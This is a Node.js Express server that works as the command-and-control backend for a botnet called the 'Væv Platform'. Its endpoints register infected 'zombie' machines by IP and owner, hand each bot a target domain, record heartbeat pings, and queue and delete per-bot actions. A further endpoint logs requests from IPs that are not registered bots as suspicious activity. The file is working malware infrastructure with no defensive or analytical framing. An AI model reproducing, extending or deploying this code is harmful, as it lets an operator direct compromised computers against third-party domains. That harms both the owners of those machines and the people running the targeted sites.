const express = require('express');
const bodyparser = require('body-parser');
const uuid = require('uuid');
const path = require('path');
const { Liquid } = require('liquidjs');

const database = require('./database.js').connect();

const app = express();

const is_today = (date) => {
    const today = new Date()
    return date.getDate() == today.getDate() &&
      date.getMonth() == today.getMonth() &&
      date.getFullYear() == today.getFullYear()
  }

app.engine('liquid', new Liquid().express());
app.set('views', './views');
app.set('view engine', 'liquid');
app.locals.basedir = path.join(__dirname, 'views');


app.use(express.static('public'));
app.use(bodyparser.json());
app.use(bodyparser.urlencoded({ extended: true }));
app.use((req, res, next) => {
	res.set('X-Powered-By', 'Væv Platform 1.0');
    next();
});

app.post('/api/v1/zombie/:architecture', (req, res) => {
    if(req.params.architecture.length <= 32)
    {
        database.query("SELECT * FROM users WHERE id = ?", [req.body.owner], function(error, users, fields) {
            if(error)
            {
                res.status(500).json({status: "failure", message: "Internal server error!"});
                res.end();
            }

            if(users.length == 1)
            {
                database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
                    if(error)
                    {
                        res.status(500).json({status: "failure", message: "Internal server error!"});
                        res.end();
                    }
                    if(zombies.length == 0)
                    {
                        const zombie = zombies[0];

                        const id = uuid.v4();
                        database.query("INSERT INTO zombies (id, ip, owner, architecture) VALUES(?, ?, ?, ?)", [id, req.ip, req.body.owner, req.params.architecture], function(error, domains, fields) {
                            if(error)
                            {
                                res.status(500).json({status: "failure", message: "Internal server error!"});
                                res.end();
                            }

                            res.status(200).json({status: "success", message: "Successfully added bot", identifier: id});
                        });
                    }
                    else
                    {
                        res.status(404).json({status: "failure", message: "This bot already exists"});
                        database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot that already exists", req.ip], function(error, result, fields) {
                            if(error) throw error;

                            console.log(`[væv] logged suspicious activity from ${req.ip}`);
                        });
                    }
                });
            }
            else
            {
                res.status(404).json({status: "failure", message: "Invalid owner passed"});

                database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot with invalid owner!", req.ip], function(error, result, fields) {
                    if(error) throw error;
        
                    console.log(`[væv] logged suspicious activity from ${req.ip}`);
                });
            }
        });
    }
    else
    {
        res.status(404).json({status: "failure", message: "Way too long architecture!"});
        database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot with huge architecture!", req.ip], function(error, result, fields) {
            if(error) throw error;

            console.log(`[væv] logged suspicious activity from ${req.ip}`);
        });
    }
});

app.get('/api/v1/domain', (req, res) => {
    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
        if(error)
        {
            res.status(500).json({status: "failure", message: "Internal server error!"});
            res.end();
        }
        if(zombies.length > 0)
        {
            const zombie = zombies[0];

            database.query("SELECT * FROM domains LIMIT 1", function(error, domains, fields) {
                if(error)
                {
                    res.status(500).json({status: "failure", message: "Internal server error!"});
                    res.end();
                }

                if(domains.length > 0)
                {
                    const found_domain = domains[0];
                    res.status(200).json({status: "success", domain: found_domain.domain});

                    database.query("INSERT INTO zombie_activity (id, info, zombie) VALUES(?, ?, ?)", [uuid.v4(), `Fetched domain '${found_domain.domain}' from API.`, zombie.id], function(error, result, fields) {
                        if(error) throw error;
    
                        console.log(`[væv] logged zombie activity from ${zombie.id}`);
                    });
                }
                else
                {
                    res.status(200).json({status: "critical", message: "There is no active domains added!"}).end();
                }
            });
        }
        else
        {
            res.status(404).json({status: "failure", message: "You're not a valid bot!"});
            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching domain", req.ip], function(error, result, fields) {
                if(error) throw error;

                console.log(`[væv] logged suspicious activity from ${req.ip}`);
            });
        }
    });
});

app.get('/api/v1/ping', (req, res) => {
    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
        if(error)
        {
            res.status(500).json({status: "failure", message: "Internal server error!"});
            res.end();
        }
        if(zombies.length > 0)
        {
            const zombie = zombies[0];

            database.query("UPDATE zombies SET last_ping = ? WHERE id = ?", [new Date(), zombie.id], function(error, domains, fields) {
                if(error)
                {
                    res.status(500).json({status: "failure", message: "Internal server error!"});
                    res.end();
                }

                res.status(200).json({status: "success", message: "Pinged server successfully"});

                database.query("INSERT INTO zombie_activity (id, info, zombie) VALUES(?, ?, ?)", [uuid.v4(), `Pinged server.`, zombie.id], function(error, result, fields) {
                    if(error) throw error;
    
                    console.log(`[væv] logged zombie activity from ${zombie.id}`);
                });
            });
        }
        else
        {
            res.status(404).json({status: "failure", message: "You're not a valid bot!"});
            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching domain", req.ip], function(error, result, fields) {
                if(error) throw error;

                console.log(`[væv] logged suspicious activity from ${req.ip}`);
            });
        }
    });
});

app.get('/api/v1/action', (req, res) => {
    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
        if(error)
        {
            res.status(500).json({status: "failure", message: "Internal server error!"});
            res.end();
        }
        if(zombies.length > 0)
        {
            const zombie = zombies[0];

            database.query("SELECT * FROM actions WHERE zombie = ? ORDER BY added_on ASC LIMIT 1", [zombie.id], function(error, actions, fields) {
                if(error)
                {
                    res.status(500).json({status: "failure", message: "Internal server error!"});
                    res.end();
                }

                if(actions.length > 0)
                {
                    res.status(200).json({status: "success", action: actions[0]});

                    database.query("INSERT INTO zombie_activity (id, info, zombie) VALUES(?, ?, ?)", [uuid.v4(), `Fetched new action.`, zombie.id], function(error, result, fields) {
                        if(error) throw error;
        
                        console.log(`[væv] logged zombie activity from ${zombie.id}`);
                    });
                }
                else
                {
                    res.status(404).json({status: "failure", message: "No actions for you!"});
                }
            });
        }
        else
        {
            res.status(404).json({status: "failure", message: "You're not a valid bot!"});
            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried getting action", req.ip], function(error, result, fields) {
                if(error) throw error;

                console.log(`[væv] logged suspicious activity from ${req.ip}`);
            });
        }
    });
});

app.delete('/api/v1/action/:id', (req, res) => {
    if(req.params.id)
    {
        database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
            if(error)
            {
                res.status(500).json({status: "failure", message: "Internal server error!"});
                res.end();
            }
            if(zombies.length > 0)
            {
                const zombie = zombies[0];
    
                database.query("SELECT * FROM actions WHERE zombie = ? AND id = ? LIMIT 1", [zombie.id, req.params.id], function(error, actions, fields) {
                    if(error)
                    {
                        res.status(500).json({status: "failure", message: "Internal server error!"});
                        res.end();
                    }
    
                    if(actions.length > 0)
                    {
                        database.query("DELETE FROM actions WHERE id = ?", [req.params.id], function(error, result, fields) {
                            if(error) throw error;
    
                            res.status(200).json({status: "success", message: "Successfully deleted action"});
                            
                            database.query("INSERT INTO zombie_activity (id, info, zombie) VALUES(?, ?, ?)", [uuid.v4(), `Deleted action.`, zombie.id], function(error, result, fields) {
                                if(error) throw error;
                
                                console.log(`[væv] logged zombie activity from ${zombie.id}`);
                            });
                        });
                    }
                    else
                    {
                        res.status(404).json({status: "failure", message: "Can't delete an action that doesn't exist"});
                    }
                });
            }
            else
            {
                res.status(404).json({status: "failure", message: "You're not a valid bot!"});
                database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching deleting action", req.ip], function(error, result, fields) {
                    if(error) throw error;
    
                    console.log(`[væv] logged suspicious activity from ${req.ip}`);
                });
            }
        });
    }
});

app.get('/', (req, res) => {
    res.status(200).render('info');
});

app.listen(8000, () => {
    console.log('[væv] started listening')
});